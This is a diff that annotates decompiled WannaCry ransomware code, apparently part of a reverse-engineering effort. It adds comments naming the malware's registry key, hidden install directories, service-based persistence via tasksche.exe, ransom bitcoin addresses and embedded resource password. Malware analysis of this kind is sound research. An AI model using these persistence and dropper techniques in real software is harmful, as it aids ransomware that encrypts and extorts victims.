@@ -841,6 +841,7 @@ undefined4 __cdecl set_or_query_registry_cwd(int set_registry) {
   HKEY regWanaHandle;
   
   iVar2 = 5;
+  // u_Software__0040e04c = Software
   software_str = (undefined4 *)u_Software__0040e04c;
   puVar3 = software_str_buf;
   
@@ -874,6 +875,7 @@ undefined4 __cdecl set_or_query_registry_cwd(int set_registry) {
   *(undefined2 *)software_str = 0;
   *(undefined *)((int)software_str + 2) = 0;
   
+  // u_WanaCrypt0r_0040e034 = WanaCrypt0r
   // Software\WanaCrypt0r
   wcscat((wchar_t *)software_str_buf,u_WanaCrypt0r_0040e034);
   
@@ -1405,6 +1407,7 @@ int create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_out) {
       DVar2 = GetFileAttributesW(dir_2);
       SetFileAttributesW(dir_2,DVar2 | 6);
       if (dir_out != (wchar_t *)0x0) {
+        // u__s__s_0040eb88 = 
         swprintf(dir_out,u__s__s_0040eb88,dir_1,dir_2);
       }
       return 1;
@@ -1460,14 +1463,17 @@ uint create_and_cwd_random_hidden_directory(wchar_t *cwd_out) {
   // gets C:\ or C:\Windows
   GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);
 
+  // u__s_ProgramData_0040f40c = C:\ProgramData or C:\Windows\ProgramData
   // C:\ProgramData or C:\Windows\ProgramData
 
   swprintf(&programdata_path,u__s_ProgramData_0040f40c,&stack0xfffffb24);
   pd_attr = GetFileAttributesW(&programdata_path);
   
   if ((pd_attr == 0xffffffff) ||
+      
      (iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out), iVar2 == 0)) {
     
+    //u__s_Intel_0040f3f8 = C:\Intel or C:\Windows\Intel
     // C:\Intel or C:\Windows\Intel
     swprintf(&programdata_path,u__s_Intel_0040f3f8,(wchar_t *)&stack0xfffffb24);
     iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
@@ -1509,6 +1515,8 @@ undefined4 __cdecl create_taskche_service(char *path_to_taskche) {
     randomstring_service = OpenServiceA(scmanager,(LPCSTR)&randomstring,0xf01ff);
     
     if (randomstring_service == (SC_HANDLE)0x0) {
+
+      // s_cmd_exe__c___s__0040f42c = cmd.exe /c \"%s
       sprintf(local_410,s_cmd_exe__c___s__0040f42c,path_to_taskche);
       hService = CreateServiceA(scmanager,(LPCSTR)&randomstring,(LPCSTR)&randomstring,0xf01ff,0x10,2
                                 ,1,local_410,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
@@ -1594,11 +1602,15 @@ void bitcoin_something(void) {
   int iVar2;
   undefined local_31c [178];
   char local_26a [602];
-  char *local_10 [3];
+  char *bitcoin_addresses [3];
   
-  local_10[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
-  local_10[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
-  local_10[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
+  // s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488 = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94"
+  // s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464 = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"
+  // s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440 = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn"
+
+  bitcoin_addresses[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
+  bitcoin_addresses[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
+  bitcoin_addresses[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
   uVar1 = FUN_00401000(local_31c,1);
 
   if (uVar1 != 0) {
@@ -1708,6 +1720,7 @@ int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdS
 
     if ((arg1_cmp == 0) &&
        (uVar1 = create_and_cwd_random_hidden_directory((wchar_t *)0x0), uVar1 != 0)) {
+         // s_tasksche_exe_0040f4d8 = tasksche.exe
       CopyFileA(filename,s_tasksche_exe_0040f4d8,0);
       DVar2 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
       
@@ -1726,6 +1739,7 @@ int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdS
   
   SetCurrentDirectoryA(filename);
   set_or_query_registry_cwd(1);
+  //s_WNcry_2ol7_0040f52c = WNcry@2ol7
   FUN_00401dab((HMODULE)0x0,s_WNcry_2ol7_0040f52c);
   bitcoin_something();
   run_command(s_attrib__h___0040f520,0,(LPDWORD)0x0);
